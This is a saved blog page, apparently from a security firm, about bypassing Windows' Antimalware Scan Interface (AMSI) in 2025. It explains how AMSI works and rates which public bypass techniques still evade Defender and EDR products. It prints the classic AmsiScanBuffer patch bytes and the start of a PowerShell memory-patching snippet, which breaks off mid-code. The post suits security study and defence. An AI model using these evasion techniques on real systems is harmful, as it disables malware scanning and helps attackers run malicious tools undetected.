# https://www.r-tec.net/r-tec-blog-bypass-amsi-in-2025.html

<!DOCTYPE html><html lang="de">
<body id="top" class="r-tec-blog-bypass-amsi-in-2025   " itemscope="" itemtype="http://schema.org/WebPage">
<div class="emergency soforthilfe"> <div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="INCIDENT RESPONSE SERVICE" href="https://www.r-tec.net/#" data-hash="#" class="hyperlink_txt sprungmarke "><span>INCIDENT RESPONSE SERVICE</span></a>
</div><div class="ce_text Kein Abstand - 0px bg-  block">
<div class="ce_text__content">
<h3>Garantierte Reaktionszeiten.<br>Umfassende Vorbereitung.</h3>
<p>Mit unserem Incident Response Service stellen wir sicher, dass Ihrem Unternehmen im Ernstfall die richtigen Ressourcen und Kompetenzen zur Verfügung stehen. Sie zahlen eine feste monatliche Pauschale und wir bieten Ihnen dafür einen Bereitschaftsdienst mit garantierten Annahme- und Reaktionszeiten. Durch einen im Vorfeld von uns erarbeiteten Maßnahmenplan sparen Sie im Ernstfall wertvolle Zeit.</p>
<p><a href="https://www.r-tec.net/incident-response-service.html">weiterlesen</a></p>            </div>
<a class="close">zurück</a></div>
</div>
<div id="wrapper">

<div id="container">
<div class="dz_stage">
<div class="dz_stage__background dz_stage__withtext dz_stage__gradient" style="background-image: url('files/content/img/Buehne_schmal/arif-wahid-266541-unsplash.jpg');">
<div class="c-image-container__copyright-layer js-copyright-close">
<div class="c-image-container__copyright-layer-close">
<svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 17 17">
<path fill="#ffffff" fill-rule="evenodd" d="M16.6892426,0.311014057 C16.2748994,-0.103671352 15.6099753,-0.103671352 15.195241,0.311014057 L8.49995112,7.00551465 L1.8051501,0.311014057 C1.39031804,-0.103671352 0.725491718,-0.103671352 0.311050725,0.311014057 C-0.103683575,0.725406195 -0.103683575,1.39015414 0.311050725,1.80493731 L7.00634058,8.49894911 L0.311050725,15.1934497 C-0.103683575,15.6081351 -0.103683575,16.2729808 0.311050725,16.6872752 C0.514213826,16.8908054 0.788063607,17 1.05428744,17 C1.3201202,17 1.59387221,16.8984304 1.79713308,16.6872752 L8.49232517,9.99287236 L15.187615,16.6872752 C15.3907781,16.8908054 15.6646279,17 15.9303629,17 C16.2042127,17 16.4704365,16.8984304 16.6735996,16.6872752 C17.0883339,16.2729808 17.0883339,15.6081351 16.6735996,15.1934497 L9.99405049,8.49894911 L16.6892426,1.80493731 C17.1035858,1.39015414 17.1035858,0.725406195 16.6892426,0.311014057"></path>
</svg>
</div>© Arif Wahid 266541 - Unsplash                                    </div>
<a href="https://www.r-tec.net/#" class="c-image-container__copyright-link js-copyright-open" title="Copyright Informationen anzeigen" tabindex="0"><i class="icon-Copyright"></i></a>
</div>
<div class="container">
<div class="row">
<div class="col-lg-12">
<div class="dz_stage__content">
<h1 class="dz_stage__headline">Bypass AMSI in 2025</h1>
<p>This post will shed some light on what's behind AMSI and how you can still effectively bypass it - more than four years later.</p>                                                    </div>
</div>
</div>
</div>
</div>
<main id="main">
<div class="inside">
<!-- indexer::stop -->

<!-- indexer::continue -->
<div class="mod_article color- Kein Abstand - 0px bg- block" id="article-3897">
<div class="container container__article">
<div class="row">
<div class="ce_ContentDate Gering - 30px bg-  block">
<div class="date">
<p>Februar 2025 Author: Fabian Mosch, <a title="ShitSecure auf Twitter" href="https://twitter.com/ShitSecure" target="_blank" rel="noopener">@ShitSecure</a></p></div>
</div>
<div class="ce_colsetStart subcolumns ce_bs_gridStart ">
<div class="c66l col_1">
<div class="subcl" style="padding-right:0;">
<div class="ce_text Kein Abstand - 0px bg-  block">
<h2>Introduction</h2>
<div class="ce_text__content">
<p>More than four years have passed since I wrote my first blog posts about bypassing the Antimalware Scan Interface (AMSI) <a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/" target="_blank" rel="noopener">via manual modification</a> and <a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" target="_blank" rel="noopener">the difference between Powershell and .NET-specific bypasses</a>:</p>
<ul>
<li><a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/" target="_blank" rel="noopener">https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/</a></li>
<li><a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" target="_blank" rel="noopener">https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/</a></li>
</ul>
<p>Since 2020, many new bypasses have been released that can be used as an alternative to the previous ones. This blog post will shed some light on what's behind AMSI (roughly, but hopefully easy to understand) and how you can still effectively bypass it - more than four years later. Has anything changed? Spoiler: only partially :-)</p>            </div>
</div>        </div>
</div>
<div class="c33r">
<div class="subcr" style="padding-left:0px;">
<div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="1. When is AMSI bypassing needed at all?" href="https://www.r-tec.net/#sprung1" data-hash="#sprung1" class="hyperlink_txt sprungmarke "><span>1. When is AMSI bypassing needed at all?</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="2. How AMSI works - and how to get around it" href="https://www.r-tec.net/#sprung2" data-hash="#sprung2" class="hyperlink_txt sprungmarke "><span>2. How AMSI works - and how to get around it</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="3. The downside of using public obfuscators" href="https://www.r-tec.net/#sprung3" data-hash="#sprung3" class="hyperlink_txt sprungmarke "><span>3. The downside of using public obfuscators</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="4. Which bypass to use?" href="https://www.r-tec.net/#sprung4" data-hash="#sprung4" class="hyperlink_txt sprungmarke "><span>4. Which bypass to use?</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="5. Is the AmsiScanbuffer patch really dead?" href="https://www.r-tec.net/#sprung5" data-hash="#sprung5" class="hyperlink_txt sprungmarke "><span>5. Is the AmsiScanbuffer patch really dead?</span></a>
</div><div class="ce_hyperlink Kein Abstand - 0px bg-  block">
<a title="6. Conclusion" href="https://www.r-tec.net/#sprung6" data-hash="#sprung6" class="hyperlink_txt sprungmarke "><span>6. Conclusion</span></a>
</div>        </div>
</div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung1">
<div class="container container__article">
<div class="row">
<div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<h2>1. When is AMSI bypassing needed at all?</h2>
<div class="ce_text__content">
<p>Although AMSI has been analysed and described in many papers and tools, I'm still surprised to see so much confusion and misunderstanding in the community. For example, a lot of shellcode loaders were published on GitHub that do nothing more than shellcode execution. But the README also states that it contains an AMSI bypass, and that's why it's never detected. So there is a lot of misunderstanding, at least on GitHub or social networks, which may confuse more and more people out there.</p>
<p>When do we really need to use an AMSI bypass? At least for shellcode execution - we don't. AMSI, as I wrote in my blog more than four years ago, is primarily used to analyse scripting languages and .NET managed code at runtime, such as</p>
<ul>
<li>Powershell</li>
<li>VBS</li>
<li>Javascript</li>
<li>VBA macros</li>
<li>C# assemblies</li>
</ul>
<p>So if you are using a Command &amp; Control Framework's payload and are mainly running BOF's or COFF's from there, you will never need to bypass AMSI at all. If you do implement a bypass in your loader, you will only increase the IoCs and the likelihood of being detected by that bypass attempt. It's always better to leave out bypasses unless you really need them!</p>
<p>On the other hand, if you want to run <strong>known malicious</strong> and <strong>unobfuscated</strong> public tools, e.G. from GitHub in any of the above languages, or reuse code from them in your own tools, you will need to bypass AMSI to get those tools to run. Are you going to execute GitHub Scripts via <code>Invoke-Expression</code> in Powershell? Are you loading a .NET assembly via <code>assembly::load()</code>? Creating malicious office macros? Loading Scripts into memory via <code>mshta.exe</code>, csc<code>ript.e</code>xe? or <code>wscript.exe</code>? You will likely need an AMSI bypass.</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung2">
<div class="container container__article">
<div class="row">
<div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<h2>2. How AMSI works - and how to get around it</h2>
<div class="ce_text__content">
<p>AMSI is mostly signature-based detection. The main difference to <em>classic</em> signature-based detections is that these signatures are looked for at runtime, whenever something potentially malicious is loaded <strong>from memory</strong>. AMSI by architecture also doesn't trigger a scan at all at certain points when something is loaded <strong>from disk</strong> into memory, as recently pointed out by <a href="https://securityintelligence.com/x-force/being-a-good-clr-host-modernizing-offensive-net-tradecraft/" target="_blank" rel="noopener">IBM X-Force Red</a>.</p>
<p>What might AMSI signatures look like? They can be simple strings like <code>Invoke-Mimikatz</code>, but also byte arrays like the bytes used for the classic <code>AmsiScanBuffer</code> patch:</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 900px; padding-left: 8px;">
<div><span style="color: #dadada;">Powershell</span></div>
<div><span style="color: #b4b4b4;">[</span><span style="color: #569cd6;">Byte</span><span style="color: #b4b4b4;">[]]</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #b5cea8;">0xB8</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x57</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x00</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x07</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0x80</span><span style="color: #b4b4b4;">,</span><span style="color: #d4d4d4;"> </span><span style="color: #b5cea8;">0xC3</span><span style="color: #b4b4b4;">)</span></div>
</div>
<p>For C# assemblies, this can be specific HEX bytes, but in my experience AMSI also uses some kind of Yara rules - or at least regular expressions. But if AMSI is about signatures, this also means that we can always get around it by modifying the code. If you change the code so that the signature doesn't apply, you can bypass AMSI. As "simple" as that, although signatures are sometimes difficult to find out.</p>
<p>The alternative to bypassing AMSI detection is to somehow break functionality within <code>amsi.dll</code> or other libraries involved in the scanning process, or to prevent the DLL from loading at all. This is what almost all publicly documented bypasses are about. They differ mainly in the technique used to break the functionality, such as</p>
<ul>
<li>Patching the memory region (also includes hooks from my perspective)</li>
<li>Using vectored exception handlers and e.g. hardware breakpoints to manipulate the workflow</li>
<li>Spawning a new process and preventing one of the relevant DLLs from loading in various ways</li>
<li>Prevent one of the relevant DLLs from being loaded before the CLR is started and/or AMSI is initialised</li>
</ul>
<p>These things are usually done at runtime. IoCs, and therefore detection of these bypasses, rely on:</p>
<ul>
<li>Signatures for the bypass code, or</li>
<li>Runtime detections such as userland hooks, ETWti or memory scans.</li>
</ul>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung3">
<div class="container container__article">
<div class="row">
<div class="ce_text Mittel - 60px bg-  block" id="lab">
<h2>3. The downside of using public obfuscators</h2>
<div class="ce_text__content">
<p>When I wrote my first blog on AMSI evasion, using public obfuscators to evade detection was still possible. Is this still the case? For fun, let's do a simple experiment. For this purpose I did let ChatGPT generate a random <a href="https://gist.github.com/S3cur3Th1sSh1t/dc8bda3635190ff2c6353833437e1a5a" target="_blank" rel="noopener">Powershell script</a> that gets <a href="https://www.virustotal.com/gui/file/96a8c5b35188109afd095c9678b0960e3914e2761c4c55d317df644efac1a481" target="_blank" rel="noopener">0 detections</a> on Virustotal for the obvious reason that it's not malicious at all.</p>
<p>After obfuscating it with <code>Invoke-Obfuscation</code> and uploading it to VirusTotal again, it gets <a href="https://www.virustotal.com/gui/file/ef2f55078f84d38f5844dd4b54b89dbe90221a94c43869c3297f7cb9ffa407ae" target="_blank" rel="noopener">1 detection</a> instead of the previous 0 detections. So at first glance it looks like only one vendor has some sort of generic rule to detect the obfuscation of <code>Invoke-Obfuscation</code>. However, a Sigma rule was triggered because there was a match for the use of <code>Invoke-Obfuscation</code> with <code>TOKEN OBFUSCATION</code>:</p>            </div>
</div><div class="ce_image Kein Abstand - 0px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21265">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-1--SIGMA-rule-triggered-20250211140109.png" width="884" height="353" alt="SIGMA rule triggered">
</button>
</div>
<figcaption class="caption">Figure 1: SIGMA rule triggered</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>How does obfuscation work against <strong>known malicious</strong> GitHub tools? Let's take two examples:</p>
<p><span style="text-decoration: underline;"><strong>Plain GitHub version</strong></span></p>
<ol>
<li><a href="https://www.virustotal.com/gui/file/8ae4b1250c8d404d41989527f8ae1ed1f8b127a49ecf78068b29437b315652c1" target="_blank" rel="noopener">Invoke-Rubeus from PowersharpPack</a> - 29 detections at the time of writing.</li>
<li><a href="https://www.virustotal.com/gui/file/2387c2cfbe2e0228fc5371231e7c4630b5e78738d0030b519c58df0b68af06a3" target="_blank" rel="noopener">WinPwn</a> - 19 detections at the time of this writing</li>
</ol>
<p><span style="text-decoration: underline;"><strong>Invoke-Obfuscation obfuscated version</strong></span></p>
<ol>
<li><a href="https://www.virustotal.com/gui/file/dd79700e06665d131e2c17633d28e215674d74780c0ef2d5d0c35018f749d910" target="_blank" rel="noopener">Invoke-Rubeus from PowersharpPack</a> - 10 detections</li>
<li><a href="https://www.virustotal.com/gui/file/2fa15e01ec3d83b21312e7ea6d0cd4018df27bade81aaf3672a824d55ace6e6e" target="_blank" rel="noopener">WinPwn</a> - 2 detections on first upload</li>
</ol>
<p>As we can see, it is still possible to evade signature-based detection with the same public obfuscators almost five years later. Wow, I didn't expect that to be honest, I thought there would be more <code>Invoke-Obfuscation</code> specific detections by now. <strong>Note: </strong>after already having this blog post finished, I fiddled around with some EDR's and the scripts from above - it turned out, that some have dedicated AMSI signatures for Invoke-Obfuscation! Even the non-malicious first script was flagged as malicious. So this means, that VirusTotal won't show you AMSI based detections but only detections based on signatures for the file itself. This fact makes <code>Invoke-Obfuscation</code> completely useless against those vendors.</p>
<p><code>WinPwn</code> broke in several places, so some features like the built-in AMSI bypass don't work anymore:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21267">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-2--Partially-broken-script-execution-20250211145502.png" width="893" height="608" alt="Partially broken script execution">
</button>
</div>
<figcaption class="caption">Figure 2: Partially broken script execution</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>But the menu was still displayed and the native Powershell functions could be used normally.</p>
<p>The obfuscated <code>Invoke-Rubeus</code> version first broke here, due to the obfuscation, as the type <code>[dreIKOpFhund.pROGRam]</code> was placed before the function and as variable and those Namespace and Class-names could not properly get resolved at this point. To fix this, I manually placed this part into the function itself after the obfuscated <code>[assembly::load]</code> line:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21269">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-3--Obfuscation-fix-for-Invoke-Rubeus-20250211144145.png" width="863" height="106" alt="Obfuscation fix for Invoke-Rubeus">
</button>
</div>
<figcaption class="caption">Figure 3: Obfuscation fix for Invoke-Rubeus</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>And this shows the first drawback, which is that obfuscators can break our code and require manual tweaking to work properly. Do we bypass AMSI for Defender?</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21312">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-4--Script-loading-execution-20250211145846.png" width="949" height="169" alt="Script loading/execution">
</button>
</div>
<figcaption class="caption">Figure 4: Script loading/execution</figcaption>
</figure>

</div><div class="ce_text Kein Abstand - 0px bg-  block" id="tools">
<div class="ce_text__content">
<p>At first glance it looks like we did, but only for the Powershell script itself and not for the Rubeus assembly that gets called at runtime. Why is that? This has already been described in my <a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" target="_blank" rel="noopener">2nd</a> private blog. So in this case we would have to obfuscate the assembly first, embed it and then obfuscate the Powershell script. And we would need to go through this approach for each and every assembly/script. Might it be easier to just use an existing AMSI bypass instead?</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung4">
<div class="container container__article">
<div class="row">
<div class="ce_text Mittel - 60px bg-  block" id="lab">
<h2>4. Which bypass to use?</h2>
<div class="ce_text__content">
<p>At the time of my first blog post, my <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell/tree/e34ce721f857fef96f5e01d88cd90b4bbe1e3319" target="_blank" rel="noopener">Amsi Bypass Powershell</a> repository contained <u>15 different bypasses</u>. More than four years later, it contains <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank" rel="noopener">23 different code snippets</a>, so 8 more. And those are just the techniques that have been published, including the Powershell code. I intentionally did not add any other published bypass, e.G. from native languages before the CLR is started at all such as my own <a href="https://github.com/S3cur3Th1sSh1t/Ruy-Lopez" target="_blank" rel="noopener">Ruy-Lopez</a> for example.</p>
<p>So the number of techniques has increased a lot. But what will be really effective in 2025 and what won't be? How can you even assess that? In general, all of the public bypasses themselves are signatured and flagged by AMSI itself, at least when implementing them in one of the mentioned scripting languages such as Powershell. So for all of them, it's necessary to manually modify or obfuscate the code so that the bypass itself is no longer flagged. This is assiduous work. And trial and error. But the problem with this approach is, that different vendors have different signatures and even if your modified bypass works against one vendor, it might fail against the next one. I did this myself for several years, but eventually realised that it's too much work.</p>
<p><span style="text-decoration: underline;"><strong>The language of choice</strong></span></p>
<p>On the other hand, sticking to native languages has the advantage that your code won't be scanned by AMSI itself. Instead, you will have to deal with "good old" signature-based detection for your binary/dll on disk. You will need to use string obfuscation/encryption, Anti-Emulation, Anti-Sandbox techniques as well as userland hook bypasses similar to scripting languages and the chosen bypass. On top, the CLR is not loaded into native processes by default as well as AMSI will not be initialized, which provides more bypass options to choose from in general. Using native programming languages has become my preferred way of bypassing AMSI these days, but this requires more background knowledge of what to look out for as well as Windows API programming in general.</p>
<p><span style="text-decoration: underline;"><strong>What is still effective</strong></span></p>
<p>How do we "rate" effectiveness? As mentioned before, <strong>ALL</strong> public bypasses can get modified to get around signature based detections on disk as well as for AMSI itself. But for some techniques, run-time detections from various vendors have become increasingly relevant. These detections cannot be bypassed as easily as signature-based detections.</p>
<h3>Patching</h3>
<p>If you choose to patch, you'll face userland hooks that prevent you from modifying the memory permissions of a<code>msi.</code>dll or writing data to its memory. You need to bypass those by using unhooking, indirect syscalls or similar.</p>
<p>And even after you have done that, you may still face ETWti/memory scan detections for a patch. A really good example is the recent Microsoft Defender detection for the classic <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank" rel="noopener">AmsiScanBuffer Patch</a>. Whenever the <code>AmsiScanBuffer</code> function (or several others) is modified to just <code>return</code>, an alert is raised and your process is killed. An AV/EDR can simply see via ETWti events, that the protection of e.G. <code>AmsiScanBuffer</code> from <code>amsi.dll</code> was modified and that data was written to this location. You cannot bypass these events from userland, as they are emitted in kernel land. The AV/EDR can afterward scan the function location to actually verify, that something malicious (in terms of a bypass) was done. Ultimately, this means that you should not stick with this particular patch, as you will likely be detected no matter what userland evasion techniques are used.</p>
<p>Note: this detection for entrypoint patching was <u>already used</u> by several other EDR vendors <u>for a couple of years</u> now, but got *more* attention when Defender introduced it because of it's widespread use.</p>
<h3>Using hardware breakpoints</h3>
<p>As a result of the aforementioned discoveries from the Patching section, people in the community came up with the idea of using hardware breakpoints. They have the great advantage that userland hooks don't need to be bypassed, the integrity of the targeted DLLs remains valid, and memory scanners can't detect manipulations.</p>
<p>In my experience, very few vendors detect the use of hardware breakpoints to bypass AMSI at runtime. In theory however, hardware breakpoints could be easily detected by checking the debug register values - if one of them is set to the <code>AmsiScanBuffer</code> address, for example, an alert could be raised. Theory vs. practice, never faced such a detection, maybe because of the false positive rate? However, a few vendors have recently come up with ETWti based detections via <code>SetThreadContext</code> as <a href="https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/" target="_blank" rel="noopener">described here</a>.</p>
<p>Overall, in my experience, using hardware breakpoints is still considered OpSec safe against <strong>most</strong> AV/EDR vendors, and therefore a recommended way to go. However, this could change any day with new detections, Cat &amp; Mouse :-)</p>
<h3>Preventing the DLL from loading</h3>
<p>There are a few techniques published, that prevent AMSI related DLLs from loading, so that the initialization and scanning will never take place at all. This can - as mentioned above - mainly be used by native languages or for newly spawned processes, as in these cases both loading and initialisation are not yet done. Examples are</p>
<ul>
<li>Creating a new process with <code>DEBUG_PROCESS</code> flag and patching the entry point on <code>LOAD_DLL_DEBUG_EVENT</code> with <a href="https://github.com/CCob/SharpBlock" target="_blank" rel="noopener">SharpBlock</a></li>
<li>Hooking functions in the DLL load process to return fail with <a href="https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/" target="_blank" rel="noopener">NtCreateSection as example</a></li>
<li>Hooking functions in the DLL load process to return fail for newly spawned processes with <a href="https://github.com/S3cur3Th1sSh1t/Ruy-Lopez" target="_blank" rel="noopener">Ruy-Lopez</a></li>
</ul>
<p>Although hooking is generally easy to see for an EDR, I'm not aware of any vendors flagging newly set hooks, probably also due to false positive rates. And even if they did alert on new hooks, hardware breakpoints could be used to achieve the same effect. So I'm not aware of any runtime-based detections for these techniques, and they remain effective to this day.</p>
<h3>Target specific alternatives</h3>
<p>Depending on the AMSI bypass target (e.g. Powershell or C# assemblies), several other alternatives can be used. In many cases it's still patching - but at different offsets/locations. Regarding Powerhell, the following graphic reflects my personal experience at the time of writing this blog post - <em><strong>don't hold me responsible</strong></em>:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21272">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/AmsiResults.png" width="1335" height="1063" alt="">
</button>
</div>
</figure>

</div><div class="ce_text Kein Abstand - 0px bg-  block" id="tools">
<div class="ce_text__content">
<p>The first bypass is a special case by now. When it was published, it worked for both Powershell scripts and loaded <code>.NET</code> assemblies. But after publication Microsoft adjusted something from within Powershell, so that it doesn't affect scripts anymore at all but instead <em>just</em> <code>.NET</code> assemblies. So this can be combined with one of the orange marked bypasses or if your script is not flagged and it loads assemblies - that's fine.</p>
<p>For all the green ones, you <em>only</em> need to obfuscate/modify the source for signature evasion and you're good to go. The red ones are much more likely to get flagged these days due to patch-based detections. Orange ones will only help for native Powershell scripts, but the moment <code>assembly::load</code> is called, AMSI is not bypassed at all. In some cases you may also need to remove <code>Add-Type</code> and stick to native Powershell alternatives. Very few vendors also use <code>clr.dll</code> hooks, in these cases you may also fail due to behaviour-based detections and need to unhook <code>clr.dll</code>.</p>
<p>The Provider Patch has two code snippets in my repo, the one with <code>Add-Type</code> only works for Powershell scripts, the one using reflection works for both scripts and <code>.NET</code> assemblies.</p>
<p>As you can see, the green/orange ones still contain some patch based bypasses. But these are less known/used and therefore not checked/found by memory scans in my experience.</p>
<p>In a few cases, EDR vendors don't even rely on <code>amsi.dll</code> for their scan anymore. Any bypass that targets this specific DLL will not result in a bypass at all. In these cases you will need to enumerate their AMSI provider DLL via the registry or memory walking and patch that or alternatively the custom AMSI DLL. More information can be found in this <a href="https://www.youtube.com/watch?v=8y8saWvzeLw" target="_blank" rel="noopener">blackhat talk</a> from 2022.</p>
<p>The C# assembly specific AMSI bypass from IBM linked above already should also not get flagged at all on runtime by now. This whole concept of "tricking" the CLR into loading an assembly from disk was not new and already published with another <code>.NET</code> specific bypass <a href="https://blog.redxorblue.com/2021/05/assemblylie-using-transactional-ntfs.html" target="_blank" rel="noopener">in 2021</a>. Since that release, Windows Defender's behaviour has not changed, and loading assemblies via the PoC <a href="https://github.com/G0ldenGunSec/SharpTransactedLoad" target="_blank" rel="noopener">SharpTransactedLoad</a> still works. However, some EDR vendors don't behave the same and also apply AMSI scans to assemblies loaded from disk, so at least the 2021 PoC is no longer fully OpSec safe.</p>            </div>
</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung5">
<div class="container container__article">
<div class="row">
<div class="ce_text Kein Abstand - 0px bg-  block" id="lab">
<h2>5. Is the AmsiScanbuffer patch really dead?</h2>
<div class="ce_text__content">
<p>After reading a blog post <a href="https://practicalsecurityanalytics.com/obfuscating-api-patches-to-bypass-new-windows-defender-behavior-signatures/" target="_blank" rel="noopener">trying to get around</a> about the recent Defender patch detections, I got curious to dig into these detections myself. What else could cause such a detection? The most known public patches use <code>0xC3</code> (RET) somewhere at the entry point of <code>AmsiScanBuffer</code> to exit the function and return <code>INVALID ARG</code>, making the caller think that nothing malicious was found. Let's play around here, just for fun.</p>
<p><span style="text-decoration: underline;"><strong>Is it just the entry point?</strong></span></p>
<p>As I said earlier, I believe that Defender uses a memory scan to check for malicious actions before it takes action. So is the memory scan just checking the beginning of the function? What does that entry point look like?</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21314">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-6--AmsiScanBuffer-Entrypoint-20250213162231.png" width="578" height="376" alt="AmsiScanBuffer Entrypoint">
</button>
</div>
<figcaption class="caption">Figure 6: AmsiScanBuffer Entrypoint</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>First the input arguments are pushed up the stack. What if we patch after <code>push r15</code> and pop the already pushed registers off the stack before returning the function with <code>INVALID ARG</code> like this:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-21316">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_Bypass-AMSI-2025/Figure-7--Alternative-patch-bytes-at-offset-0_14-20250213163216.png" width="852" height="207" alt="Alternative patch bytes at offset 0x14">
</button>
</div>
<figcaption class="caption">Figure 7: Alternative patch bytes at offset 0x14</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>This is what the code looks like:</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 900px; padding-left: 8px;">
<div><span style="color: #b4b4b4;">&gt; </span><span style="color: #dadada;">powershell</span></div>
<div><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">Win32</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">=</span><span style="color: #d4d4d4;"> </span><span style="color: #e8c9bb;">@"</span><br><span style="color: #ce9178;">using System;</span><br><span style="color: #ce9178;">using System.Runtime.InteropServices;</span><br><span style="color: #ce9178;">public class Win32 {</span><br><span style="color: #ce9178;"> [DllImport("kernel32")]</span><br><span style="color: #ce9178;"> public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span><br><span style="color: #ce9178;"> [DllImport("kernel32")]</span><br><span style="color: #ce9178;"> public static extern IntPtr LoadLibrary(string name);</span><br><span style="color: #ce9178;"> [DllImport("kernel32")]</span><br><span style="color: #ce9178;"> public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span><br><span style="color: #ce9178;">}</span><br><span style="color: #e8c9bb;">"@</span><br><span style="color: #dcdcaa;">Add-Type</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">Win32</span> <br><br><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">LoadLibrary</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">=</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">[</span><span style="color: #569cd6;">Win32</span><span style="color: #b4b4b4;">]</span><span style="color: #d4d4d4;">::LoadLibrary</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">am</span><span style="color: #e8c9bb;">"</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">+</span><span style="color: #d4d4d4;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">si.dll</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">)</span><br><span style="color: #b4b4b4;">$</span><span style="color: #9cdcfe;">Address</span><span style="color: #d4d4d4;"> </span><span style="color: #b4b4b4;">=</span><span style="color: #d4d4d4;"> </span><span style="color: 